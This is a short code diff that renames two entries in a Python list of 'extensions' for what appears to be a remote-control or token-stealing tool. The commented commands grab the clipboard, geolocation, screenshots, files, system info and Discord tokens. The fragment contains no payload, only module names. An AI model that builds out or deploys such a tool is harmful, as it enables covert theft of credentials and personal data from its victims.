@@ -177,12 +177,12 @@ extensions = (
     "clipboard",      # /get_clipboard
     "geolocate",      # /get_geolocation
     "directory",      # /get_currentdir & /set_currentdir & /list_directory & /list_rawdir
-    "rawTokens",      # /raw_tokens & /raw_discord
+    "rawtokens",      # /raw_tokens & /raw_discord
     "sendfiles",      # /sendfiles
     "systeminfo",     # /get_systeminfo
     "screenshot",     # /get_screenshot
     "receivefiles",   # /receivefiles
-    "checkedTokens",  # /checked_tokens
+    "checkedtokens",  # /checked_tokens
 )
 
 for ex in extensions:
